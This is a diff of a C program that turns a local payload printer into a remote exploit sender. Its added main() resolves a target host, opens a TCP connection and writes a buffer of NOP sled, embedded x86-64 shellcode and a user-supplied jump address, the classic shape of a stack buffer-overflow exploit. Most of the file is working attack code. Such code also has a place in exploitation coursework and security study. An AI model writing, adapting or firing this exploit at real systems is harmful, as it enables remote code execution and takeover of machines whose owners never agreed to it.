@@ -1,7 +1,68 @@
 #include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <stdlib.h>
 #include <string.h>
-#include <stdlib.h>
-#include <stdlib.h>
+
+typedef struct BUFFER_S {
+    char* buff;
+    int size;
+} Buffer;
+
+Buffer* generateShellCode(char *addrstr);
+
+int main(int argc, char *argv[]) {
+  int sock, numbytes;
+  struct sockaddr_in server;
+  struct hostent *hp;
+
+  char buf[BUFSIZ + 1];
+  char* host;
+
+  if(argc != 4) {
+    printf("Usage: %s <host> <port> <jump>\n", argv[0]);
+    exit(1);
+  }
+  Buffer* dados = generateShellCode(argv[3]);
+
+  host = argv[1];
+
+  if((hp = gethostbyname(host)) == NULL){
+    printf("Couldn't resolve host.\n");
+    exit(1);
+  }
+
+  bcopy((char *) hp->h_addr_list[0], (char*)&server.sin_addr, hp->h_length);
+  server.sin_family = hp->h_addrtype;
+
+  server.sin_port = htons(atoi(argv[2]));
+
+  if((sock = socket(hp->h_addrtype, SOCK_STREAM, 0)) < 0){
+    printf("Couldn't create socket.\n");
+    exit(1);
+  }
+
+  if(connect(sock, (struct sockaddr *) &server, sizeof(server)) < 0){
+    printf("Couldn't connect socket.\n");
+    exit(1);
+  }
+  
+  if(write(sock, dados->buff, dados->size) != dados->size){
+    printf("Couldn't write to socket.\n");
+    exit(1);
+  }
+
+  read(sock, buf, BUFSIZ);
+  printf("Received: %s\n", buf);
+
+  close(sock);
+
+  exit(0);
+
+}
 
 #define NOP 0x90
 
@@ -16,11 +77,6 @@ unsigned char shellcode[] =
 "\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
 "\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
 "\x78\xed\xff\xe6";
-
-typedef struct BUFFER_S {
-    char* buff;
-    int size;
-} Buffer;
 
 Buffer* generateShellCode(char *addrstr) {
     int nop_padding = 100;
@@ -61,14 +117,4 @@ Buffer* generateShellCode(char *addrstr) {
     buffer->buff[total_size] = '\0';
 
     return buffer;
-}
-
-int main(int argc, char** argv)
-{
-    Buffer* buffer = generateShellCode(argv[1]);
-
-    for(int i = 0; i < buffer->size; i++)
-        printf("%c", buffer->buff[i]);
-
-    return 0;
 }
